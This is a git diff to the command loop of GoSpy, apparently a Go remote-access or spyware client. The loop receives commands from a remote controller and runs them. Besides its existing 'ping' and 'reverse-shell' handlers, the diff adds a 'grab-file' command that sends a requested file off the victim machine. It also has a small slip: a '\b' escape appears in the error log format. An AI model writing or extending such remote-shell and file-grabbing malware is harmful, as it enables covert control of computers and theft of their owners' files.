@@ -3,8 +3,11 @@ package client
 import (
 	"github.com/psidex/GoSpy/internal/commands"
 	"github.com/psidex/GoSpy/internal/comms"
+	"io"
 	"log"
+	"net"
 	"os"
+	"strings"
 )
 
 // CommandLoop is the loop that receives commands and executes them.
@@ -20,7 +23,9 @@ func CommandLoop(c comms.Connection) (err error) {
 		message := string(messageBytes)
 		log.Printf("Recv: %s", message)
 
-		switch message {
+		args := strings.Split(message, " ")
+
+		switch args[0] {
 
 		case "exit":
 			log.Println("Exiting")
@@ -28,16 +33,21 @@ func CommandLoop(c comms.Connection) (err error) {
 
 		case "ping":
 			err = commands.PingReply(c)
-			if err != nil {
-				break
-			}
 
 		case "reverse-shell":
 			err = commands.ReverseShellReply(c)
-			if err != nil {
-				break
-			}
 
+		case "grab-file":
+			path := strings.Join(args[1:], " ")
+			err = commands.GrabFileReply(c, path)
+
+		}
+
+		if _, isNetErr := err.(net.Error); isNetErr == true || err == io.EOF {
+			break
+		}
+		if err != nil {
+			log.Printf("Command error: %s\b", err.Error())
 		}
 	}
 	return err
